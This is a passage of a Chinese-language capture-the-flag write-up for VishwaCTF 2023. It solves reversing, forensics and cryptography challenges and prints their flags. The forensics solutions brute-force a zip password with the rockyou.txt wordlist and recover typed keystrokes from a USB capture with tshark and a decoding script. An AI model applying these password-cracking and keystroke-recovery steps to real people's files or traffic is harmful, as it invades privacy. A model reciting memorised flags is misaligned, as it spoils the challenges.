+<span class="line"><span style="color:#79B8FF">print</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'I hope you have enjoyed whole journey..'</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#79B8FF">print</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'You know me .. Who I am ....'</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#79B8FF">print</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'ONLY CAPITAL CASES ARE ALLOWED AND _ BETWEEN TWO WORD'</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#F97583">for</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">in</span><span style="color:#79B8FF"> range</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">4</span><span style="color:#E1E4E8">):</span></span>
+<span class="line"><span style="color:#E1E4E8">    key </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> input</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'Enter my last message for my daughter ---->'</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#E1E4E8">    ans </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> 'I_LOVE_YOU_3000'</span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> ans </span><span style="color:#F97583">==</span><span style="color:#E1E4E8"> key:</span></span>
+<span class="line"><span style="color:#79B8FF">        print</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'Nice !!!!. You have got me.'</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#79B8FF">        print</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"Flag format ---> vishwaCTF{My Bestfriend's Name_First Apperance year}"</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#E1E4E8">        c </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> input</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'Bye....meet you in 2023'</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#F97583">        break</span></span>
+<span class="line"><span style="color:#F97583">        continue</span></span>
+<span class="line"><span style="color:#79B8FF">    print</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"Wrong !!! you don't know me.."</span><span style="color:#E1E4E8">)</span></span></code></pre>
+<h2 id="forensics">Forensics</h2>
+<h3 id="the-sender-conundrum">The Sender Conundrum</h3>
+<blockquote>
+<p>Marcus Got a Mysterious mail promising a flag if he could crack the password to the file.</p>
+</blockquote>
+<p>得到一个加密压缩包 <code>unzipme.zip</code> 和 <code>TheEmail.eml</code>，直接使用记事本打开邮件原文 <code>TheEmail.eml</code> 得到关键信息</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>Hello this is u but from future</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>I am a noun and not a verb or an adverb. I am given to you at birth and never taken away, You keep me until you die, come what may. What am I?</span></span></code></pre>
+<p>问了一下 ChatGPT 他说答案是 <code>Name</code>，但是尝试了一下密码不对，直接尝试爆破，尝试了很多字典，最后通过 <code>rockyou.txt</code> 爆破出了正确密码 <code>BrandonLee</code></p>
+<p><img src="https://img.5ime.cn/vishwactf-2023/image-20230403110153940.png" alt="image-20230403110153940"></p>
+<p>解压后得到 <code>flag</code></p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>vishwaCTF{1d3n7i7y_7h3f7_is_n0t_4_j0k3}</span></span></code></pre>
+<h3 id="1nj3ct0r">1nj3ct0r</h3>
+<blockquote>
+<p>You Are Working As Digital Forensics Expert At Infosys India And Someone Reported That A PC Might Have Been Infected. Tech Team Already Collected All The Evidences From Workstation And Found That Someone Injected Malicious Code. It Is Your Job To Find, what Is Injected Into That PC.</p>
+<p>NOTE:Use Underscore(_) After Every Word.</p>
+</blockquote>
+<p>wireshark 打开附件发现是 USB 流量，我们通过 <code>tshark</code> 导出所有长度为 <code>2</code> 和内容不为空的流量</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>./tshark.exe -r usbforensics.pcapng -2 -R "usb.data_len==2 &#x26;&#x26; usb.capdata!=0000" -T fields -e usb.capdata >usbdata.txt</span></span></code></pre>
+<p>得到所有的按键流量</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>00:09</span></span>
+<span class="line"><span>00:0f</span></span>
+<span class="line"><span>00:04</span></span>
+<span class="line"><span>00:0a</span></span>
+<span class="line"><span>20:33</span></span>
+<span class="line"><span>20:2f</span></span>
+<span class="line"><span>00:11</span></span>
+<span class="line"><span>00:27</span></span>
+<span class="line"><span>00:1a</span></span>
+<span class="line"><span>20:2d</span></span>
+<span class="line"><span>00:1c</span></span>
+<span class="line"><span>00:27</span></span>
+<span class="line"><span>00:18</span></span>
+<span class="line"><span>20:2d</span></span>
+<span class="line"><span>00:21</span></span>
+<span class="line"><span>00:1f</span></span>
+<span class="line"><span>00:20</span></span>
+<span class="line"><span>20:2d</span></span>
+<span class="line"><span>00:07</span></span>
+<span class="line"><span>00:27</span></span>
+<span class="line"><span>00:11</span></span>
+<span class="line"><span>00:20</span></span>
+<span class="line"><span>20:2d</span></span>
+<span class="line"><span>00:1a</span></span>
+<span class="line"><span>00:1e</span></span>
+<span class="line"><span>00:24</span></span>
+<span class="line"><span>00:0b</span></span>
+<span class="line"><span>20:2d</span></span>
+<span class="line"><span>00:18</span></span>
+<span class="line"><span>00:22</span></span>
+<span class="line"><span>00:25</span></span>
+<span class="line"><span>20:2d</span></span>
+<span class="line"><span>00:09</span></span>
+<span class="line"><span>00:27</span></span>
+<span class="line"><span>00:1f</span></span>
+<span class="line"><span>00:20</span></span>
+<span class="line"><span>00:11</span></span>
+<span class="line"><span>00:22</span></span>
+<span class="line"><span>00:1e</span></span>
+<span class="line"><span>00:06</span></span>
+<span class="line"><span>00:22</span></span>
+<span class="line"><span>20:30</span></span></code></pre>
+<p>直接脚本解密得到 flag</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#E1E4E8">normalKeys </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> {</span><span style="color:#9ECBFF">"04"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"a"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"05"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"b"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"06"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"c"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"07"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"d"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"08"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"e"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"09"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"f"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"0a"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"g"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"0b"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"h"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"0c"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"i"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"0d"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"j"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"0e"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"k"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"0f"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"l"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"10"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"m"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"11"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"n"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"12"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"o"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"13"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"p"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"14"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"q"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"15"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"r"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"16"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"s"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"17"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"t"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"18"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"u"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"19"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"v"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"1a"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"w"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"1b"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"x"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"1c"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"y"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"1d"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"z"</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">"1e"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"1"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"1f"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"2"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"20"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"3"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"21"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"4"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"22"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"5"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"23"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"6"</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">"24"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"7"</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">"25"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"8"</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">"26"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"9"</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">"27"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"0"</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">"28"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"&#x3C;RET>"</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">"29"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"&#x3C;ESC>"</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">"2a"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"&#x3C;DEL>"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"2b"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">\t</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">"2c"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"&#x3C;SPACE>"</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">"2d"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"-"</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">"2e"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"="</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">"2f"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"["</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">"30"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"]"</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">"31"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">\\</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">"32"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"&#x3C;NON>"</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">"33"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">";"</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">"34"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"'"</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">"35"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"&#x3C;GA>"</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">"36"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">","</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">"37"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"."</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">"38"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"/"</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">"39"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"&#x3C;CAP>"</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">"3a"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"&#x3C;F1>"</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">"3b"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"&#x3C;F2>"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"3c"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"&#x3C;F3>"</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">"3d"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"&#x3C;F4>"</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">"3e"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"&#x3C;F5>"</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">"3f"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"&#x3C;F6>"</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">"40"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"&#x3C;F7>"</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">"41"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"&#x3C;F8>"</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">"42"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"&#x3C;F9>"</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">"43"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"&#x3C;F10>"</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">"44"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"&#x3C;F11>"</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">"45"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"&#x3C;F12>"</span><span style="color:#E1E4E8">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">usb_data </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> open</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'usbdata.txt'</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">for</span><span style="color:#E1E4E8"> line </span><span style="color:#F97583">in</span><span style="color:#E1E4E8"> usb_data:</span></span>
+<span class="line"><span style="color:#E1E4E8">    key </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> line.split(</span><span style="color:#9ECBFF">":"</span><span style="color:#E1E4E8">)[</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">]</span></span>
+<span class="line"><span style="color:#E1E4E8">    key </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> key.strip()</span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> key </span><span style="color:#F97583">in</span><span style="color:#E1E4E8"> normalKeys:</span></span>
+<span class="line"><span style="color:#79B8FF">        print</span><span style="color:#E1E4E8">(normalKeys[key], </span><span style="color:#FFAB70">end</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">""</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#6A737D"># flag;[n0w-y0u-423-d0n3-w17h-u58-f023n51c5]</span></span></code></pre>
+<h2 id="cryptography">Cryptography</h2>
+<h3 id="the-indecipherable-cipher">The Indecipherable Cipher</h3>
+<blockquote>
+<p>Our crypto specialist Mr.Kasiski is currently unavailable, so help us decode this string.</p>
+<p>String: j3qrh4kgz3iptmyqxcw0zkm8i5xugs5lwl0lrwvirwktlqinexcw0zkmq5nqvpebpor5wqipqhw2ikzm4ipktzlr</p>
+</blockquote>
+<p>一开始用 <code>cyberchef</code> 没出来，接着用 <code>cipher-identifier</code> 猜测以下什么编码</p>
+<p><img src="https://img.5ime.cn/vishwactf-2023/image-20230403111032949.png" alt="image-20230403111032949"></p>
+<p>试了一下 <code>Base32</code> 未果，尝试 <code>维吉尼亚密码</code> 发现可行，因为密文中存在数字，所以密码表需要手动加上 <code>0-9</code></p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>VishwaCTF{friedrichwilhelmkasiskiwastheonewhodesignedtheaaakasiskiexaminationtodecodevignerecipher}</span></span></code></pre>
+<p><img src="https://img.5ime.cn/vishwactf-2023/image-20230403110655113.png" alt="image-20230403110655113"></p>   </div> <div class="mt-12 pt-8 border-t border-gray-200"> <div class="bg-gray-50 p-6 rounded-lg text-sm text-gray-700 leading-relaxed relative overflow-hidden">  <svg class="absolute -top-11 -right-8 w-40 h-40 opacity-10 pointer-events-none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"> <path fill="#4a4a4a" d="M245.8 214.9l-33.2 17.3c-9.4-19.6-25.2-20-27.4-20-22.2 0-33.3 14.6-33.3 43.9 0 23.5 9.2 43.8 33.3 43.8 14.4 0 24.6-7 30.5-21.3l30.6 15.5a73.2 73.2 0 01-65.1 39c-22.6 0-74-10.3-74-77 0-58.7 43-77 72.6-77 30.8-.1 52.7 11.9 66 35.8zm143 0l-32.7 17.3c-9.5-19.8-25.7-20-27.9-20-22.1 0-33.2 14.6-33.2 43.9 0 23.5 9.2 43.8 33.2 43.8 14.5 0 24.7-7 30.5-21.3l31 15.5c-2 3.8-21.3 39-65 39-22.7 0-74-9.9-74-77 0-58.7 43-77 72.6-77C354 179 376 191 389 214.8zM247.7 8C104.7 8 0 123 0 256c0 138.4 113.6 248 247.6 248C377.5 504 496 403 496 256 496 118 389.4 8 247.6 8zm.8 450.8c-112.5 0-203.7-93-203.7-202.8 0-105.5 85.5-203.3 203.8-203.3A201.7 201.7 0 01451.3 256c0 121.7-99.7 202.9-202.9 202.9z"></path> </svg>  <div class="relative z-10"> <div class="mb-2"> <strong class="text-gray-900">本文作者：</strong> <span>iami233</span> </div> <div class="mb-2"> <strong class="text-gray-900">本文链接：</strong> <a href="https://5ime.cn/vishwactf-2023/" title="https://5ime.cn/vishwactf-2023/" target="_blank" rel="noopener" class="text-blue-600 hover:text-blue-800 break-all"> https://5ime.cn/vishwactf-2023/ </a> </div> <div> <strong class="text-gray-900">版权声明：</strong> <span>本文采用 </span> <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank" rel="external nofollow noopener noreferrer" class="text-blue-600 hover:text-blue-800">
+CC BY-NC-SA 3.0 CN
+</a> <span> 协议进行许可</span> </div> </div> </div> <div id="waline" data-astro-cid-cjuph4ok></div> <script type="module" src="/_astro/Comment.astro_astro_type_script_index_0_lang.BRmPG2zJ.js"></script>  </div>  </div> <script type="module" src="/_astro/Fancybox.astro_astro_type_script_index_0_lang.DeGMrsLV.js"></script> </article> </main> <footer class="py-8 px-4 pb-12 text-center text-[rgb(var(--gray))] bg-gradient-to-b from-transparent to-[rgb(var(--gray-gradient))]">
+&copy; 2025 iami233. All rights reserved.
+</footer> <script type="module" src="/_astro/BlogPost.astro_astro_type_script_index_1_lang.znP5JH7M.js"></script></body></html>
